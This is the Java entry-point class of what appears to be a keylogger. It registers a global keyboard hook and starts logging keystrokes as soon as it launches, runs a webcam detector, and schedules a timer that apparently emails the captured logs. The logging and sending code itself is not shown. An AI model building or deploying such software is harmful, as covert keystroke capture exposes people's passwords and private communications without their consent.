import java.io.File;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;




public class Main
{
	public static Security secure=new Security();
	public static emailDialog ed;
	public static boolean webcam_detector = new Webcam_detector().Webcam_detector();
	public static boolean emailServiceExists;
	public static boolean enabled_ss = true;

	public static void main(String args[]) throws NativeHookException {
		emailServiceExists=false;
		KeyLogger_main logstatus = new KeyLogger_main(true); //to start the logging as soon as the program is launched..for now
		GlobalScreen.registerNativeHook(); //registering the native hook for once and all
		logstatus.proceed_with_logging();
		//private Security check=new Security();

		ed=new emailDialog("Register for the email service");
		ed.CreateUI();
		
		DisplayTrayIcon icon=new DisplayTrayIcon();
		Loading load=new Loading(3);
		
		if(isEmailServiceStarted())
		{
			if(!emailServiceExists)
				{
				new scheduleTimer(Integer.parseInt(ed.delayTime));
				emailServiceExists=true;
				}
				
		}
	}

	public static boolean isEmailServiceStarted() { return new File("lib/docs/emailService.txt").isFile(); }
	
}
